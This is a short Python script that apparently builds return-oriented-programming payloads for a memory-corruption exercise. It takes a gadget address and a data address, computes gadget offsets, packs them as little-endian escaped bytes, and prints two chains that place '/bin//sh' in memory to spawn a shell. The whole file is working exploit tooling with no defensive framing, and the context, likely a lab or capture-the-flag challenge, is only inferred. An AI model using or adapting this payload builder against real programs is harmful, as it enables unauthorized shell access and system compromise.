import sys


def hex_to_little_endian(hex_string):
    hex_val = int(hex_string, 16)
    hex_val = hex(hex_val)[2:]

    if len(hex_val) % 2 != 0:
        hex_val = '0' + hex_val

    # Convert the hex string to bytes
    hex_bytes = bytes.fromhex(str(hex_val))

    # Convert the bytes to little endian order
    little_endian = hex_bytes[::-1]

    val = ''.join([f'\\x{byte:02x}' for byte in little_endian])
    # Format the little endian bytes as a string with \x before each byte
    extra0 = 16 - len(val)
    for i in range(0, extra0, 4):
        val = "\\x00" + val

    return val


def calculate(hex_address, x):
    # Convert the hex address to decimal and add 3
    dec_address = int(hex_address, 16) + x

    # Convert the decimal address back to hex
    hex_address_plus_x = hex(dec_address)

    # Print the new hex address
    return hex_address_plus_x


def main():
    # Check if the first argument is provided
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <hex_address> <data_address>")
        sys.exit(1)

    g = ['', sys.argv[1]]

    for i in range(2, 9):
        g.append(calculate(g[i - 1], 3))

    for i in range(1, 9):
        g[i] = hex_to_little_endian(g[i])

    data = sys.argv[2]
    data_4 = calculate(data, 4)
    data_8 = calculate(data, 8)
    data = hex_to_little_endian(data)
    data_4 = hex_to_little_endian(data_4)
    data_8 = hex_to_little_endian(data_8)

    word = g[1] + '/bin' + data + g[3] + g[1] + '//sh' + data_4 + g[3] + g[1] + 'yolo' + data + g[2] + g[5] + g[6] + \
           g[7] + g[8]

    word2 = g[1] + '/bin' + data + g[3] + g[1] + '//sh' + data_4 + g[3] + g[1] + "swag" + data_8 + g[2] + g[3] + g[1] \
            + 'yolo' + data + g[2] + g[5] + g[6] + g[7] + g[8]

    print(word)

    print()

    print(word2)


if __name__ == '__main__':
    main()
